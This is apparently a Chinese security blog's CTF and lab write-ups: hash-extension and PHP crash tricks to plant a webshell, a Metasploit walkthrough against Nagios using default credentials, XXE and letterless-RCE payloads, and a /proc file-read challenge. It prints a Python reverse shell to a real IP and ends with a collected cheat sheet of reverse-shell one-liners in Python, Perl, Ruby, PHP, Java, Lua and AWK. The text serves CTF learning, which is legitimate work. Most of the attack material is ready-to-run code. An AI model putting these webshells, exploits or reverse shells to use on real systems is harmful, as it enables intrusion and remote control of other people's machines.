<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> HelloPhp();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>

<h1 id="Ezinclude"><a href="#Ezinclude" class="headerlink" title="Ezinclude"></a>Ezinclude</h1><p><img src="image-20201030092624788.png" alt="image-20201030092624788"></p>
<p>第一步，这里说是cookies里面有一个hash，是hash拓展攻击：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://ha1cyon-ctf.fun:30004/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    a,b=hashpumpy.hashpump(<span class="string">&#x27;a3dabbc779f2fbf8b6f56113ca78a7f9&#x27;</span>,<span class="string">&#x27;123444&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,i)</span><br><span class="line"></span><br><span class="line">    req=requests.get(url+<span class="string">&quot;name=&#123;&#125;&amp;pass=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(urllib.parse.quote(b),a))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username/password error&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        print(req.text,url+<span class="string">&quot;name=&#123;&#125;&amp;pass=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(urllib.parse.quote(b),a))</span><br><span class="line">        </span><br></pre></td></tr></table></figure>

<p>?然而实际做的时候把cookies的值丢进去当作password的就过去了。</p>
<p><img src="image-20201030092846076.png" alt="image-20201030092846076"></p>
<p>读取到三个php文件：</p>
<p>flflflflag.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/data|input|zip/is&#x27;</span>,$file))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>($file);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">@$name=$_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">@$pass=$_GET[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(md5($secret.$name)===$pass)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span></span><br><span class="line"><span class="string">           window.location.href=&quot;flflflflag.php&quot;;</span></span><br><span class="line"><span class="string">	&lt;/script&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	setcookie(<span class="string">&quot;Hash&quot;</span>,md5($secret.$name),time()+<span class="number">3600000</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;username/password error&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;!--md5($secret.$name)===$pass --&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>config.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$secret=<span class="string">&#x27;%^$&amp;$#fffdflag_is_not_here_ha_ha&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用dirb还能扫出来一个dir.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">		<span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">		[<span class="number">0</span>]=&gt;</span><br><span class="line">		<span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;.&quot;</span></span><br><span class="line">		[<span class="number">1</span>]=&gt;</span><br><span class="line">		<span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;..&quot;</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">include</span>($_GET[<span class="string">&quot;file&quot;</span>])&lt;/body&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里会列出tmp目录下的所有文件，</p>
<p>那看来还是要写🐎进去啊，可是伪协议被过滤了该怎么写🐎呢？</p>
<p>参考文章：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;183046</span><br></pre></td></tr></table></figure>

<p>从这篇文章中我们可以知道，当PHP陷入崩溃的时候他会自动的重启，清理掉自己的内存，但是与此同时这就会导致PHP会停止自己手头的工作，这样的话于此同时我们直接POST一段数据，将会被php保存至tmp目录下没有停下。随机生成一个文件，但是又根据题目的dir.php，可以让我们看见tmp目录下有什么，所以直接包裹即可~</p>
<p>抄来的exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">payload = <span class="string">&quot;&lt;?php eval($_POST[a]);?&gt;&quot;</span></span><br><span class="line">file_data=&#123;</span><br><span class="line">   <span class="string">&#x27;file&#x27;</span>: BytesIO(payload.encode())</span><br><span class="line">&#125;</span><br><span class="line">url=<span class="string">&quot;http://a53738f6-1115-449b-b4af-167a2c1a5b1a.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">   r=requests.post(url=url,files=file_data,allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">        print(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>重点就是用string.strip_tags这一点构造出php的内存溢出即可得到。之后访问dir.php可以看见有什么文件成功上传：</p>
<p><img src="image-20201031145743370.png" alt="image-20201031145743370"></p>
<p>进行文件包含即可</p>
<p><img src="image-20201031150107473.png" alt="image-20201031150107473"></p>
<p>flag一样的PHP info（）当中</p>
]]></content>
  </entry>
  <entry>
    <title>Nagios渗透</title>
    <url>/2020/11/08/Nagios%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h1 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h1><p>经典NMAP</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nmap -sS -v -T4 -Pn -A -p <span class="number">0</span>-<span class="number">65535</span> <span class="number">172</span>.<span class="number">192</span>.<span class="number">168</span>.<span class="number">235</span>.<span class="number">135</span></span><br></pre></td></tr></table></figure>

<p>drib</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">dirb http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">29</span>.<span class="number">128</span>/</span><br></pre></td></tr></table></figure>



<p>Nmap的结果如下：</p>
<p><img src="image-20201108194244662.png" alt="image-20201108194244662"></p>
<p>而dirb的结果：</p>
<p><img src="image-20201108194339973.png" alt="image-20201108194339973"></p>
<p>感觉有点鸡肋啊..dirb的结果</p>
<h1 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h1><p>WTM直接用exp库</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">searchsploit nagios</span><br></pre></td></tr></table></figure>



<p>msfconsole</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">search nagios</span><br></pre></td></tr></table></figure>

<p>之后使用show options查看我们需要填写什么</p>
<p>查看还需要设置的选项 show options，为YES且空的就是还需要我们设置的。 可以看到下图中RHOST参数还未设置内容</p>
<p><img src="1089831-20170102213249769-373635510.png" alt="img"></p>
<p>发现这个需要设置密码，于是尝试测试默认密码登陆NagiosXI，在该文章中得到账号为NagiosAdmin</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ywnz.com&#x2F;linuxyffq&#x2F;6587.html</span><br></pre></td></tr></table></figure>

<p>密码为admin</p>
<p>这里讲一下msfconsole怎么用的..</p>
<h1 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h1><p>首先search 漏洞</p>
<p>show options 可以查看有什么条件我们还没有设置</p>
<p>再之后设置rhost和lhost，其中rhost为被攻击的机子</p>
<p><strong>lhost为攻击机，也就是我们的kali</strong></p>
<p>之后直接run，发现失败</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">] Exploit aborted due to failure: no-access: Authentication failed. Please provide a valid username and password.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>于是把我们刚刚得到的password填写上去admin</p>
<p>得到run之后执行shell，whoami查看权限就是root了</p>
]]></content>
  </entry>
  <entry>
    <title>PHP的一个内置类</title>
    <url>/2020/11/16/PHP%E7%9A%84%E4%B8%80%E4%B8%AA%E5%86%85%E7%BD%AE%E7%B1%BB/</url>
    <content><![CDATA[<p>某店里比赛题目：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> $c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$ra,$rb</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="comment">//        $c = $ra;</span></span><br><span class="line"><span class="comment">//        $c = $rb;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">h</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">j</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">k</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">l</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">m</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">p</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">q</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$rc=$_GET[<span class="string">&quot;rc&quot;</span>];</span><br><span class="line">$rb=$_GET[<span class="string">&quot;rb&quot;</span>];</span><br><span class="line">$ra=$_GET[<span class="string">&quot;ra&quot;</span>];</span><br><span class="line">$rd=$_GET[<span class="string">&quot;rd&quot;</span>];</span><br><span class="line">$method= <span class="keyword">new</span> $rc($ra, $rb);</span><br><span class="line">var_dump($method-&gt;$rd());</span><br></pre></td></tr></table></figure>

<p>我们可以控制四个参数，但是我们明显知道，这里的User类完全没有意义，题目给出提示让我们想想还有什么类，想了半天应该是内置类，队里的w4nder师傅直接给我exp了，WTM直接开舔</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?rc&#x3D;SimpleXMLElement&amp;ra&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;index.php&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;&#x2F;x&gt;&amp;rb&#x3D;2&amp;rd&#x3D;__toString</span><br></pre></td></tr></table></figure>

<p>无字母RCE：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_&#x3D;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);  &#x2F;&#x2F;$_GET[_]($_GET[__])</span><br><span class="line">http:&#x2F;&#x2F;69.90.132.196:5003&#x2F;?warmup&#x3D;$_&#x3D;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_&#x3D;readfile&amp;__&#x3D;flag.php</span><br></pre></td></tr></table></figure>

<p>另外还看到了一种读文件的 payload，收藏了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$_=<span class="string">&quot;@:&gt;;963:&quot;</span>^<span class="string">&quot;2_______&quot;</span>; <span class="comment">// readfile</span></span><br><span class="line">$__=<span class="string">&quot;____&quot;</span>^<span class="string">&quot;830=&quot;</span>; <span class="comment">// glob</span></span><br><span class="line">$_($__(<span class="string">&#x27;*&#x27;</span>)[<span class="number">0</span>]); <span class="comment">// readfile(glob(&#x27;*&#x27;))</span></span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>PicDown</title>
    <url>/2020/12/16/PicDown/</url>
    <content><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ol>
<li>文件包含</li>
<li>linux信息文件读取</li>
</ol>
<h1 id="做题思路"><a href="#做题思路" class="headerlink" title="做题思路"></a>做题思路</h1><p>开局就可以找到一个文件读取的地方，利用burp就可以抓取数据</p>
<p><img src="image-20201216154655759.png" alt="image-20201216154655759"></p>
<p>之后你可以直接读取到flag了[</p>
<p>我感觉有点奇怪，这道题应该没那么简单，看了别人的WP才知道应该读取linuxproc下的文件，这里整理一下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/proc/[pid]/cmdline  #查看当前linux正在执行什么命令，在这里pid不知道的情况下我们可以通过self代指当前web端的文件</span><br><span class="line"></span><br><span class="line">/proc/self/comm #查看当前进程的命令名</span><br><span class="line"></span><br><span class="line">/proc/self/cwd #查看当前工作目录的符号连接</span><br><span class="line">cwd下面会有可以读取的文件，比如</span><br><span class="line">/var/www/html 下我在工作，那么/proc/self/cwd/index.php 同样可以读取到</span><br><span class="line"></span><br><span class="line">/proc/self/environ #显示进程的环境变量</span><br><span class="line"></span><br><span class="line">/proc/self/exe #查看实际运行程序的符号链接</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/proc/self/fd #一个目录，包含进程打开文件的情况（注意这里曾经出过考点，如果看到一个程序Python打开某个txt之后没有关闭，就可以利用这里来读取 </span><br></pre></td></tr></table></figure>



<p>既然是flask文件，那么我们可以尝试读取app.py，获取源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = <span class="string">&quot;/tmp/secret.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/page&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page</span>():</span></span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> url.lower().startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=<span class="string">&#x27;application/octet-stream&#x27;</span>)</span><br><span class="line">            response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=beautiful.jpg&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = <span class="string">&quot;HACK ERROR!&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        value = <span class="string">&quot;SOMETHING WRONG!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>, res=value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/no_one_know_the_manager&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">manager</span>():</span></span><br><span class="line">    key = request.args.get(<span class="string">&quot;key&quot;</span>)</span><br><span class="line">    print(SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(<span class="string">&quot;shell&quot;</span>)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = <span class="string">&quot;ok&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">&quot;Wrong Key!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>



<p>接下来我们就要去拿到key，直接读取/tmp/secret.txt会读取不到，因为已经被删掉了，那么我们就应该去尝试读取/proc/self/fd/3，结果还是出不来，这下就只能爆破了。。。看看回显长度明显不对的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,time</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">    url = <span class="string">&quot;http://ab2b25bc-4b91-4cdd-8783-c166e7d6ebae.node3.buuoj.cn/page?url=../../../../../../proc/&#123;&#125;/fd/3&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    res = requests.get(url=url).text</span><br><span class="line">    print(<span class="built_in">len</span>(res),<span class="string">&quot;此时i为&quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">    time.sleep(<span class="number">0.05</span>)</span><br></pre></td></tr></table></figure>

<p>这里我得进程是14，爆破得到</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">yoKTwnWJilxVJnoa8y9HwwAAagZ7aKs0MGPKhMbjYWA=</span><br></pre></td></tr></table></figure>

<p>既然只能执行os.system,直接反弹shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;118.89.227.105&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>

<p>弹过去就拿到shell了</p>
<p><img src="image-20201216163429545.png" alt="image-20201216163429545"></p>
<p>这里顺便把各种语言一句话反弹shell记录在此：</p>
<p>python:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;x.x.x.x&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>

<p>perl:</p>
<p>1</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;x.x.x.x&quot;;$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>2</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -MIO -e <span class="string">&#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;x.x.x.x:5555&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>Ruby</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e &#39;exit if fork;c&#x3D;TCPSocket.new(&quot;x.x.x.x&quot;,&quot;5555&quot;);while(cmd&#x3D;c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39;</span><br></pre></td></tr></table></figure>

<p>PHP</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;x.x.x.x&quot;,5555);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">	<span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Revs</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> Exception </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        String cmd[]= &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/x.x.x.x/5555;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;;</span><br><span class="line">        Process p = r.exec(cmd);</span><br><span class="line">        p.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Lua</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">lua -e <span class="string">&quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;x.x.x.x&#x27;,&#x27;5555&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span></span><br></pre></td></tr></table></figure>

<p>AWK</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN&#123;s=&quot;/inet/tcp/0/x.x.x.x/8080&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



